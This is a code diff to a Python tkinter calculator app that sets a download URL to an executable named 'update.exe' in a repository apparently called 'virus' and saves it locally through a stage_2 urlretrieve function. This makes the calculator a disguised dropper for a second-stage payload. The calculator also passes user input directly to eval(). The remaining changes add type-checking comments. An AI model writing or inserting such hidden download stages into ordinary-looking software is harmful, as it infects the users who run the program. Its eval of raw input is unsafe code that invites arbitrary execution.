@@ -4,8 +4,8 @@ from shared import *
 
 set_priority()
 
-download_url = ''
-file_name = 'payload.py'
+download_url = 'https://raw.githubusercontent.com/Omena0/virus/main/src/update.exe'
+file_name = 'update/update.exe'
 
 def stage_2():
     urlretrieve(download_url, file_name)
@@ -35,24 +35,24 @@ def answer():
     ans = str(input_box.get())
     try:
         evaluate = eval(ans)
-        input_box.delete(0, END)
-        input_box.insert(END, evaluate)
+        input_box.delete(0, END) # type: ignore
+        input_box.insert(END, evaluate) # type: ignore
     except TypeError:
-        input_box.delete(0, END)
-        input_box.insert(END, "Error")
+        input_box.delete(0, END) # type: ignore
+        input_box.insert(END, "Error") # type: ignore
 
 def input_num(num):
     dv = str(input_box.get())
     num = dv + str(num)
-    input_box.delete(0, END)
-    input_box.insert(END, num)
+    input_box.delete(0, END) # type: ignore
+    input_box.insert(END, num) # type: ignore
 
 def clear_display():
-    input_box.delete(0, END)
+    input_box.delete(0, END) # type: ignore
 
 def backspace():
     bs = input_box.get()
-    input_box.delete(0, END)
+    input_box.delete(0, END) # type: ignore
     input_box.insert(0, bs[0:-1])
 
 # Define button dimensions
